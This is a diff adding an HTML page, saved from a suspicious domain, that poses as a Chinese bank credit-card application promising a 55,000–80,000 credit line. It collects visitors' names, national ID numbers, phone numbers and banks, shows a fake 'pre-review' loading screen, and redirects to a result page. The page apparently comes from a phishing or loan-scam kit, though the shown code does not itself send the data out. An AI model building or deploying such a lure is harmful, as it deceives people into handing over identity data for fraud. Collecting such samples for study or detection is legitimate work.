@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<!-- saved from url=(0085)http://2lichen.top/3file/3302138052069835707/?bsm=652925199501051026&rid=c4aa45af-ac56 -->
+<html lang="zh-cn">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>信用卡申请</title>
+
+	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
+	<link rel="stylesheet" href="./file/index.css">
+
+</head>
+
+<body
+	style="background-image:url(./file/bg.23d071ef.jpg);background-size:100vw 100vh;background-repeat: no-repeat;margin:0px;font-family: Helvetica Neue,Helvetica,PingFang SC,Hiragino Sans GB,Microsoft YaHei,SimSun,sans-serif;">
+	<div id="app">
+		<center>
+			<div class="el-image" style="width: 70%;"><img src="./file/h1.png" class="el-image__inner">
+			</div>
+			<div class="el-card is-always-shadow" style="width: 90%; margin-top: -4px;">
+				<el-card class="box-card">
+					<el-form ref="ruleForm" :model="ruleForm" :rules="rules">
+						<el-form-item label="姓名" prop="name" label-width="100px">
+							<el-input v-model="ruleForm.name" placeholder="请输入您的姓名"></el-input>
+						</el-form-item>
+						<el-form-item label="身份证号" prop="idCard" label-width="100px">
+							<el-input v-model="ruleForm.idCard" placeholder="请输入您的身份证号"></el-input>
+						</el-form-item>
+						<el-form-item label="手机号码" prop="phone" label-width="100px">
+							<el-input v-model="ruleForm.phone" placeholder="请输入您的手机号码"></el-input>
+						</el-form-item>
+						<el-form-item label="银行" prop="bank" label-width="100px">
+							<el-select v-model="ruleForm.bank" placeholder="请选择">
+								<el-option v-for="item in bankArr" :key="item" :label="item" :value="item">
+								</el-option>
+							</el-select>
+						</el-form-item>
+						<div class="minmoney">
+							<span>
+								最低申请额度55000-80000
+							</span>
+						</div>
+						</el-form-item>
+						<el-form-item>
+							<el-button type="primary" @click="submitForm('ruleForm')"
+								class="el-button btn el-button--warning">立即测算</el-button>
+						</el-form-item>
+					</el-form>
+				</el-card>
+			</div>
+
+		</center>
+		<div>
+			<div style="font-size: 14px; color: rgb(255, 255, 255); padding: 35px;">本人已知悉并同意【用户授权协议】全部内容，授权使用个人信息
+			</div>
+		</div>
+		<center>
+			<div class="mask"
+				style="display: none; background-color: black; opacity: 0.4; width: 100%; height: 100%; top: 0px; position: absolute;">
+			</div>
+			<div class="loading" style="display: none; z-index: 200; position: absolute; top: 40%; left: 30%;">
+				<div class="el-image loadingImg" style="width: 150px; height: 150px;"><img src="./file/loading.gif"
+						class="el-image__inner">
+					<!---->
+				</div>
+				<div style="color: white; margin-top: -50px;">预审中，请耐心等待</div>
+			</div>
+		</center>
+	</div>
+
+	<script src="./file/jquery.min.js"></script>
+	<script src="./file/vue.min.js"></script>
+	<script src="./file/index.js"></script>
+
+	<script>
+		new Vue({
+			el: '#app',
+			data: function () {
+				return {
+					loading: true,
+					checked: false,
+					bankArr: [
+						"中国银行",
+						"农行银行",
+						"邮政银行",
+						"建设银行",
+						"招商银行",
+						"中信银行",
+						"广发银行",
+						"平安银行",
+						"兴业银行",
+						"民生银行",
+						"广州银行",
+						"光大银行",
+						"华夏银行",
+						"浦发银行",
+						"农村银行",
+					],
+					ruleForm: {
+						name: '',
+						phone: '',
+						idCard: '',
+						bank: '',
+					},
+					rules: {
+						name: [{
+							required: true,
+							message: '请输入您的姓名',
+							trigger: 'blur'
+						}, ],
+						phone: [{
+								required: true,
+								message: '请输入您的手机号码',
+								trigger: 'blur'
+							},
+							{
+								pattern: /^(13[0-9]|14[579]|15[0-3,5-9]|16[6]|17[0135678]|18[0-9]|19[89])\d{8}$/,
+								message: "请输入正确的手机号码"
+							}
+						],
+						idCard: [{
+								required: true,
+								message: '请输入您的身份证号',
+								trigger: 'blur'
+							},
+							{
+								pattern: /^[1-9]\d{5}(18|19|20)\d{2}((0[1-9])|(1[0-2]))(([0-2][1-9])|10|20|30|31)\d{3}[0-9Xx]$/,
+								message: "请输入正确的身份证号"
+							}
+						],
+						bank: [{
+							required: true,
+							message: '请选择银行',
+							change: 'blur'
+						}],
+					}
+				}
+			},
+			methods: {
+				// 截取url中的code
+				getUrlCode() {
+					var url = location.search;
+					var theRequest = new Object();
+					if (url.indexOf("?") !== -1) {
+						var str = url.substr(1)
+						var strs = str.split("&");
+						for (var i = 0; i < strs.length; i++) {
+							theRequest[strs[i].split("=")[0]] = (strs[i].split("=")[1])
+						}
+					}
+					return theRequest;
+				},
+				topage() {},
+				changeState() {
+					window.location.href = 'result.html?name=' + _this.ruleForm.name;
+				},
+				submitForm(formName) {
+					var _this = this;
+					this.$refs[formName].validate((valid) => {
+						if (valid) {
+							// if (!_this.checked) {
+							//   _this.$message.error('请阅读并勾选用户协议');
+							//   return false;
+							// }
+							$(".mask").show();
+							$(".loading").show();
+
+							setTimeout(function () {
+								window.location.href = 'result.html?name=' + encodeURIComponent(_this
+									.ruleForm.name);
+							}, 10000 / 2);
+						} else {
+							console.log('error submit!!');
+							return false;
+						}
+					});
+				},
+			}
+		});
+	</script>
+	<style scoped="" lang="scss">
+		/* #app {
+				background-image: url(img/login-bg.f93cdab6.png);
+				background-size: 100% 100%;
+			} */
+
+		.p {
+			color: #ababab;
+			font-size: 13px;
+		}
+
+		.el-dialog {
+			width: 70%;
+		}
+
+		.el-dialog__headerbtn {
+			top: 15px;
+		}
+
+		.tips {
+			color: #d6706e;
+			background-color: #fff6f7;
+			padding: 10px 0;
+			margin: 15px 0 30px -20px;
+			width: 115%;
+		}
+
+		.tips2 {
+			margin-top: 10px;
+			opacity: .7;
+		}
+
+		.tips2 .space {
+			margin-top: 8px;
+			margin-bottom: 8px;
+		}
+
+		.tips2 p {
+			width: 92.8vw;
+			margin-left: 3.8vw;
+			font-size: 10px;
+			font-family: PingFangSC-Regular;
+			color: #fff;
+		}
+
+		.btn {
+			background-color: #ebb563 !important;
+			border-color: #ebb563 !important;
+			border-radius: 20px !important;
+			width: 80% !important;
+			color: #FFF !important;
+		}
+
+		.ty {
+			color: #ababab;
+		}
+
+		.xy {
+			color: #278cff;
+		}
+
+		.max-bg {
+			width: 100%;
+			text-align: center;
+			padding-top: 70px;
+			margin-bottom: 5px;
+		}
+
+
+
+		.max-num-bg {
+			display: inline-block;
+			background: url(img/max-num-bg.45bfe67b.png) no-repeat;
+			width: 246px;
+			height: 25px;
+			background-size: 100% 100%;
+			position: relative;
+		}
+
+		.loan-num {
+			width: 311px;
+			height: 63px;
+			margin: 0 auto;
+			background: url(img/loan-num-icon.b50dc8c2.png) no-repeat;
+			background-size: 100% 100%;
+		}
+
+		.max-input-gold-icon {
+			position: absolute;
+			width: 60px;
+			height: 60px;
+			background: url(img/gold-coin-icon.633e7a16.png) no-repeat;
+			background-size: 100% 100%;
+			transform: rotate(90deg);
+			right: -40px;
+			top: -25px;
+		}
+
+		.loan-desc {
+			display: flex;
+			width: 335px;
+			margin: 10px auto;
+			-webkit-box-pack: justify;
+			justify-content: space-between;
+		}
+
+		.loan-desc-item {
+			text-align: center;
+			position: relative;
+		}
+
+		.desc-title {
+			opacity: .8;
+			display: inline-block;
+			width: 78px;
+			height: 22px;
+			background-image: linear-gradient(114deg, #abcfff, #fddae7);
+			border-radius: 12px;
+			text-align: center;
+			font-size: 12px;
+			line-height: 22px;
+			color: #2e53c1;
+			margin-bottom: 2px;
+		}
+
+
+
+		.dot {
+			text-align: center;
+			position: absolute;
+			left: -5px;
+			top: 24px;
+			font-size: 16px;
+			opacity: .7;
+			color: #fff;
+		}
+
+		.desc-explain {
+			opacity: .7;
+			width: 85px;
+			text-align: left;
+			font-family: PingFangSC-Regular;
+			font-size: 10px;
+			position: relative;
+			left: 10px;
+			top: 4px;
+			color: #fff;
+		}
+
+		.el-select {
+			width: 100%;
+		}
+
+		.minmoney {
+			text-align: center;
+			width: 100%;
+			font-size: 14px;
+			color: #606266;
+			line-height: 30px;
+			box-sizing: border-box;
+		}
+	</style>
+
+</body>
+
+</html>
